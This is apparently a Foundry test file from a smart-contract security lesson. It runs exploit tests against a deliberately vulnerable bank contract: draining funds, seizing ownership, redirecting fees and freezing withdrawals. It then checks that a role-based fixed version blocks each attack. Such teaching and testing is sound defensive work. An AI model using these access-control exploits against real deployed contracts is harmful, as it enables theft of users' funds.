// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {IAccessControl} from "@openzeppelin/contracts/access/IAccessControl.sol";
import {VulnerableAdminBank} from "../src/vulnerable/VulnerableAdminBank.sol";
import {SecureAdminBank} from "../src/fixed/SecureAdminBank.sol";

contract BrokenAccessControlExploitTest is Test {
    VulnerableAdminBank bank;
    address alice = makeAddr("alice");
    address attacker = makeAddr("attacker");

    function setUp() public {
        bank = new VulnerableAdminBank();
        vm.deal(alice, 10 ether);
        vm.prank(alice);
        bank.deposit{value: 10 ether}();
    }

    function test_Exploit_StealAllFunds() public {
        vm.prank(attacker);
        bank.emergencyWithdraw();
        assertEq(attacker.balance, 10 ether);
        assertEq(address(bank).balance, 0);
    }

    function test_Exploit_TakeOwnership() public {
        vm.prank(attacker);
        bank.transferOwnership(attacker);
        assertEq(bank.owner(), attacker);
    }

    function test_Exploit_RedirectFees() public {
        vm.startPrank(attacker);
        bank.setFeeRecipient(attacker);
        bank.setFeeBps(10_000);
        vm.stopPrank();
        assertEq(bank.feeRecipient(), attacker);
        assertEq(bank.feeBps(), 10_000);
    }

    function test_Exploit_FreezeBank() public {
        vm.prank(attacker);
        bank.pause();
        vm.prank(alice);
        vm.expectRevert("paused");
        bank.withdraw(1 ether); // Alice ne peut plus retirer ses fonds
    }
}

contract BrokenAccessControlFixedTest is Test {
    SecureAdminBank bank;
    address admin = makeAddr("admin");
    address pauser = makeAddr("pauser");
    address alice = makeAddr("alice");
    address attacker = makeAddr("attacker");

    function setUp() public {
        bank = new SecureAdminBank(admin, pauser);
        vm.deal(alice, 10 ether);
        vm.prank(alice);
        bank.deposit{value: 10 ether}();
        targetContract(address(bank));
    }

    function _expectUnauthorized(address who, bytes32 role) internal {
        vm.expectRevert(abi.encodeWithSelector(IAccessControl.AccessControlUnauthorizedAccount.selector, who, role));
    }

    function test_Fixed_AttackerCannotSetFee() public {
        _expectUnauthorized(attacker, bank.ADMIN_ROLE());
        vm.prank(attacker);
        bank.setFeeBps(10_000);
    }

    function test_Fixed_AttackerCannotRedirectFees() public {
        _expectUnauthorized(attacker, bank.ADMIN_ROLE());
        vm.prank(attacker);
        bank.setFeeRecipient(attacker);
    }

    function test_Fixed_AttackerCannotPause() public {
        _expectUnauthorized(attacker, bank.PAUSER_ROLE());
        vm.prank(attacker);
        bank.pause();
    }

    function test_Fixed_AdminCannotExceedFeeCap() public {
        vm.prank(admin);
        vm.expectRevert("fee too high");
        bank.setFeeBps(10_000);
    }

    function test_Fixed_PauserCannotUnpause() public {
        vm.prank(pauser);
        bank.pause();
        _expectUnauthorized(pauser, bank.ADMIN_ROLE());
        vm.prank(pauser);
        bank.unpause();
    }

    function test_Fixed_UserKeepsFunds() public {
        vm.prank(alice);
        bank.withdraw(10 ether);
        assertEq(alice.balance, 10 ether);
    }

    // Fuzzing : seul l'admin peut modifier les frais
    function testFuzz_OnlyAdminSetsFee(address caller, uint256 b) public {
        vm.assume(caller != admin);
        vm.prank(caller);
        vm.expectRevert();
        bank.setFeeBps(b);
    }

    // Invariant : les frais ne dépassent jamais le plafond
    function invariant_FeeBelowCap() public view {
        assertLe(bank.feeBps(), bank.MAX_FEE_BPS());
    }
}
